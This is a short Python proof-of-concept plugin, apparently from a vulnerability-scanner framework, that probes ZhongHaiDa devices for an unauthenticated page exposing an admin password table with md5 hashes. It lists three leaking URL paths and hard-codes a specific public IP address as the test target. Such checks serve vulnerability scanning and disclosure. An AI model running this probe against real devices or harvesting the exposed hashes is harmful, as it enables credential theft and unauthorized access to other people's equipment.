#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 中海达设备信息泄露(管理员密码)
refer: http://www.wooyun.org/bugs/wooyun-2010-0136374
POC:
    http://foobar/browse/browse_user_db.php
    http://foobar/browse/browse_data_db.php
    http://foobar/browse/browse_ant_db.php
'''

import urlparse

def assign(service, arg):
    if service == 'zhonghaida_vnet':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'browse/browse_user_db.php'
    code, head, res, err, _ = curl.curl2(url)
    if code == 200 and '<th class="subheader"> md5(password) </th>' in res:
        security_hole('information disclosure: ' + url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('zhonghaida_vnet','http://220.172.222.162:8000/')[1])